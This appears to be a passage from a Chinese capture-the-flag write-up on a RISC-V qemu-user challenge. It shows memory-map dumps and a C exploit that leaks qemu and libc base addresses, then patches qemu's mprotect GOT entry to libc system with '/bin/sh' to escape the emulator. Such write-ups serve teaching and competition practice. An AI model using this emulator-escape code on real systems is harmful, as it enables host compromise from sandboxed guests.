...
```c
$ cat /proc/89175/maps
00010000-0006c000 r--p 00000000 00:37 274                                /mnt/hgfs/桌面/starctf/favourite_architecture/share/main
0006c000-0006f000 rw-p 0005b000 00:37 274                                /mnt/hgfs/桌面/starctf/favourite_architecture/share/main
...
xuanxuan@ubuntu:/mnt/hgfs/桌面/riscv$ cat /proc/89997/maps
00010000-0007a000 r--p 00000000 00:37 4951                               /mnt/hgfs/桌面/riscv/memtest/test
0007a000-0007b000 r--p 00069000 00:37 4951                               /mnt/hgfs/桌面/riscv/memtest/test
...
$ riscv64-linux-gnu-gcc -static test.c -o test
$ ./qemu-riscv64 ./test
10000-6e000 r--p 00000000 00:37 5109                                     /mnt/hgfs/桌面/riscv/memtest/test
6e000-6f000 r--p 0005d000 00:37 5109                                     /mnt/hgfs/桌面/riscv/memtest/test
6f000-71000 rw-p 0005e000 00:37 5109                                     /mnt/hgfs/桌面/riscv/memtest/test
...
$ riscv64-linux-gnu-gcc -static test.c -o test
$ ./qemu-riscv64 ./test
00010000-0006e000 r--p 00000000 00:37 5110                               /mnt/hgfs/桌面/riscv/memtest/test
0006e000-0006f000 r--p 0005d000 00:37 5110                               /mnt/hgfs/桌面/riscv/memtest/test
0006f000-00071000 rw-p 0005e000 00:37 5110                               /mnt/hgfs/桌面/riscv/memtest/test
00071000-00094000 rw-p 00000000 00:00 0 
4000000000-4000001000 ---p 00000000 00:00 0 
4000001000-4000801000 rw-p 00000000 00:00 0 
55f8e252b000-55f8e2994000 r-xp 00000000 00:37 5094                       /mnt/hgfs/桌面/riscv/memtest/qemu-riscv64
55f8e2b93000-55f8e2bcf000 r--p 00468000 00:37 5094                       /mnt/hgfs/桌面/riscv/memtest/qemu-riscv64
55f8e2bcf000-55f8e2bfb000 rw-p 004a4000 00:37 5094                       /mnt/hgfs/桌面/riscv/memtest/qemu-riscv64
...
留出一定的交互，复杂的字符串处理操作交给人或者python来处理：
...
> l
561a145a7000-561a1463e000 r--p 00000000 00:37 5094                       /mnt/hgfs/桌面/riscv/memtest/qemu-riscv64
561a1463e000-561a14832000 r-xp 00097000 00:37 5094                       /mnt/hgfs/桌面/riscv/memtest/qemu-riscv64
561a14832000-561a14c5d000 r--p 0028b000 00:37 5094                       /mnt/hgfs/桌面/riscv/memtest/qemu-riscv64
561a14c5e000-561a14cbf000 r--p 006b6000 00:37 5094                       /mnt/hgfs/桌面/riscv/memtest/qemu-riscv64
561a14cbf000-561a14ceb000 rw-p 00717000 00:37 5094                       /mnt/hgfs/桌面/riscv/memtest/qemu-riscv64
...
561a1463e000-561a14832000 r-xp 00097000 00:37 5094                       /mnt/hgfs/桌面/riscv/memtest/qemu-riscv64
561a14832000-561a14c5d000 r--p 0028b000 00:37 5094                       /mnt/hgfs/桌面/riscv/memtest/qemu-riscv64
561a14c5e000-561a14cbf000 rw-p 006b6000 00:37 5094                       /mnt/hgfs/桌面/riscv/memtest/qemu-riscv64
561a14cbf000-561a14ceb000 rw-p 00717000 00:37 5094                       /mnt/hgfs/桌面/riscv/memtest/qemu-riscv64
7f2f1942f000-7f2f19454000 r--p 00000000 08:05 1050755                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
read or wirte or mprotect or leak?
> r
...
mprotect  = lambda addr,len,prot  :  (sla("> ","m"),sla("addr:",hex(addr)),sla("len :",hex(len)),sla("prot: ",str(prot)))
...
char* get_addr(char * pattern){
    char buf[0x1000] = {0};
    int  fd = openat(0,"/./proc/self/maps",0);
    read(fd,buf,0x1000);close(fd);
    char * tmp = strtok(buf, "\n");
    while (tmp != NULL)
    {   
        if(strstr(tmp,pattern) && strstr(tmp,"r--p 00000000")){
            *(tmp + 12) = 0;
            return strdup(tmp);
        }
        tmp = strtok(NULL, "\n");
...
int main(){
    char * qemu_leak = get_addr("/usr/local/bin/qemu-riscv64");
    char * libc_leak = get_addr("/usr/lib/x86_64-linux-gnu/libc-");
    long long * qemu_base,* libc_base;

    sscanf(qemu_leak,"%p",&qemu_base);
    sscanf(libc_leak,"%p",&libc_base);
    
    long long * libc_system    = libc_base + 0x55410/8;
    long long * mprotect_got   = qemu_base + 0x7171C0/8;
    long long * ro_memory      = qemu_base + 0x6b7000/8;
    int ro_length              = 0x0061000;

    mprotect(ro_memory,ro_length,6);
    * mprotect_got = (long long)libc_system;
    * ro_memory = 0x68732f6e69622f;
    mprotect(ro_memory,ro_length,6);
}
```
...
上面零交互的代码里有非常多的字符串处理函数，把这玩意写进shellcode中难度比较大，故还是采取交互的方法，python处理泄露地址的过程：
